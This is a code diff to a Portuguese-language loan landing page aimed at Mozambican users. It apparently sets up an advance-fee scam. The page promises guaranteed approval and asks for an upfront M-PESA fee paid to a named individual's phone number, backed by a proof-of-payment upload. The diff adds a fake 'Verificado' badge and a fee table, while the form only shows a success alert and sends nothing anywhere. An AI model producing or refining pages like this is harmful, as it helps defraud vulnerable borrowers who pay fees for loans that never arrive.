@@ -46,6 +46,13 @@ footer{padding:35px;text-align:center;background:#111;margin-top:50px;border-top
 footer p{color:#00bfff;}
 .fadeIn{opacity:0;transform:translateY(20px);animation:fadeIn 1s forwards;}
 @keyframes fadeIn{to{opacity:1;transform:translateY(0);}}
+table{border-collapse:collapse;width:100%;margin-top:15px;}
+th, td{padding:10px;border-bottom:1px solid #00bfff;text-align:left;}
+th{color:#00bfff;}
+td{color:#00ffff;}
+.badge{display:inline-block;padding:4px 10px;background:#00ffff;color:#000;border-radius:6px;font-weight:bold;margin-left:10px;font-size:14px;}
+.client-dashboard{padding:25px;margin-top:30px;background:#111;border-radius:12px;box-shadow:0 0 25px #00bfff;max-width:750px;margin:auto;}
+.client-dashboard h2{color:#00bfff;margin-bottom:20px;text-align:center;}
 </style>
 </head>
 <body>
@@ -66,7 +73,7 @@ footer p{color:#00bfff;}
 <div class="slider">
 <div class="slides">
 <div class="slide fadeIn"><h2>Empréstimo Rápido</h2><p>Receba aprovação em até 24h. Primeira taxa apenas no primeiro empréstimo.</p></div>
-<div class="slide fadeIn"><h2>Mais Aderido</h2><p>Plano popular com aprovação garantida e pagamento seguro via M-PESA.</p></div>
+<div class="slide fadeIn"><h2>Mais Aderido <span class="badge">Verificado</span></h2><p>Plano popular com aprovação garantida e pagamento seguro via M-PESA.</p></div>
 <div class="slide fadeIn"><h2>Suporte Exclusivo</h2><p>Atendimento via WhatsApp disponível 24/7.</p></div>
 </div>
 <button class="slider-btn prev">&#10094;</button>
@@ -109,12 +116,42 @@ footer p{color:#00bfff;}
 <option value="nampula">Nampula</option>
 </select>
 <label>Valor do Empréstimo (MZN)</label>
-<input type="number" name="valor" required>
-<div class="taxa">Taxa de inscrição cobrada apenas no primeiro empréstimo.</div>
-<label>Comprovante de Pagamento M-PESA (850515522 – Eunice Rodrigues)</label>
+<input type="number" name="valor" id="valorEmprestimo" required>
+<div class="taxa">Taxa de inscrição cobrada apenas no primeiro empréstimo: MZN 50 (Pagável para Eunice Rodrigues – 850515522)</div>
+
+<!-- Tabela de resumo -->
+<table id="tabelaResumo">
+<thead>
+<tr>
+<th>Valor do Empréstimo</th>
+<th>Taxa de Inscrição</th>
+<th>Valor Total a Pagar</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td id="tblValor">0 MZN</td>
+<td id="tblTaxa">50 MZN</td>
+<td id="tblTotal">50 MZN</td>
+</tr>
+</tbody>
+</table>
+
+<label>Comprovante de Pagamento M-PESA</label>
 <input type="file" name="comprovante" accept="image/*" required>
 <button type="submit">Enviar Solicitação</button>
 </form>
+</section>
+
+<!-- Dashboard interna de clientes -->
+<section class="client-dashboard">
+<h2>Clientes Submetidos</h2>
+<table id="clientsTable">
+<thead>
+<tr><th>Nome</th><th>Telefone</th><th>Email</th></tr>
+</thead>
+<tbody></tbody>
+</table>
 </section>
 
 <section class="depoimentos" id="taxas">
@@ -151,44 +188,56 @@ if(h<24) horas.innerText=h+=1;
 if(c>=1500 && a>=1200 && h>=24) clearInterval(interval);
 },50);
 
-// Formulário com barra de progresso
+// Formulário com barra de progresso e tabela dinâmica
 const form=document.getElementById('loanForm');
 const progress=document.getElementById('progress');
+const tblValor=document.getElementById('tblValor');
+const tblTaxa=document.getElementById('tblTaxa');
+const tblTotal=document.getElementById('tblTotal');
+const taxaInscricao=50;
+const clientsTable=document.getElementById('clientsTable').querySelector('tbody');
+
 form.addEventListener('input',()=>{
 let total=form.elements.length;
 let filled=0;
 for(let el of form.elements){if(el.value) filled++;}
 progress.style.width=`${(filled/total)*100}%`;
 });
-form.addEventListener('submit',(e)=>{
+
+document.getElementById('valorEmprestimo').addEventListener('input', e=>{
+let valor=parseFloat(e.target.value)||0;
+let total=valor+taxaInscricao;
+tblValor.innerText=`${valor.toFixed(2)} MZN`;
+tblTaxa.innerText=`${taxaInscricao.toFixed(2)} MZN`;
+tblTotal.innerText=`${total.toFixed(2)} MZN`;
+});
+
+form.addEventListener('submit', e=>{
 e.preventDefault();
+const nome=form.nome.value;
+const telefone=form.telefone.value;
+const email=form.email.value;
+// Adiciona na dashboard interna
+const row=clientsTable.insertRow();
+row.insertCell(0).innerText=nome;
+row.insertCell(1).innerText=telefone;
+row.insertCell(2).innerText=email;
 alert('Solicitação enviada com sucesso! Nossa equipe entrará em contacto em até 24h.');
 form.reset(); progress.style.width='0%';
+tblValor.innerText='0 MZN'; tblTotal.innerText='50 MZN';
 });
 
 // Dashboard Chart
 const ctx=document.getElementById('loanChart').getContext('2d');
-const loanChart=new Chart(ctx,{
+new Chart(ctx,{
 type:'line',
 data:{
 labels:['Jan','Feb','Mar','Abr','Mai','Jun'],
-datasets:[{
-label:'Empréstimos Aprovados',
-data:[5,15,10,20,25,35],
-backgroundColor:'rgba(0,191,255,0.2)',
-borderColor:'#00bfff',
-borderWidth:2,
-tension:0.3,
-fill:true
-}]
+datasets:[{label:'Empréstimos Aprovados',data:[5,15,10,20,25,35],backgroundColor:'rgba(0,191,255,0.2)',borderColor:'#00bfff',borderWidth:2,tension:0.3,fill:true}]
 },
-options:{
-responsive:true,
-plugins:{legend:{display:false}},
-scales:{y:{beginAtZero:true}}
-}
+options:{responsive:true,plugins:{legend:{display:false}},scales:{y:{beginAtZero:true}}}
 });
 </script>
 
 </body>
-                                                      </html>
+                                                                                  </html>
